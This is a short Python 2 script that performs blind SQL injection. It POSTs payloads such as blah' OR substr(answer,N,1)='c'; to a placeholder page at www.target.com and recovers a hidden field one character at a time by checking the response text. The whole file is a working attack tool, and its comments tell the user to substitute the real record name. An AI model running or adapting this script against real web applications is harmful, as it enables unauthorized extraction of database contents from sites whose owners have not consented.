import requests
import re

def findNextLetter(num):
	#Numbers
	for one in range(48,58):
		#The payload is a SQL query that tests a substring of the record - change "answer" to whatever the record name is
		payload = '''blah' OR substr(answer,''' + str(num) + ''',1)=\'''' + chr(one) + '''\';'''
		
		#Now we take the crafted URL and POST data, and pull down a server response to search through
		post = requests.post('http://www.target.com/page.php', data = {'answer':payload})
		
		#Do a regex that looks for text that indicates both parts of your query failed
		match = re.findall("This text means it failed",post.text)

		#If it matches something, print it out
		if(match):
			print chr(one)

  	#Run the same code for uppercase letters
  	#Uppercase alphabet
	for one in range(65,91):
		payload = '''blah' OR substr(answer,''' + str(num) + ''',1)=\'''' + chr(one) + '''\';'''
		post = requests.post('http://www.target.com/page.php', data = {'answer':payload})
		match = re.findall("This text means it failed",post.text)
		if(match):
			print chr(one)

  	#Run the same code for lowercase letters
	#Lowercase alphabet
	for one in range(97,123):
		payload = '''blah' OR substr(answer,''' + str(num) + ''',1)=\'''' + chr(one) + '''\';'''
		post = requests.post('http://www.target.com/page.php', data = {'answer':payload})
		match = re.findall("This text means it failed",post.text)
		if(match):
			print chr(one)

#Run the find code against a certain number of letters
for n in range(1,50):
	findNextLetter(n)
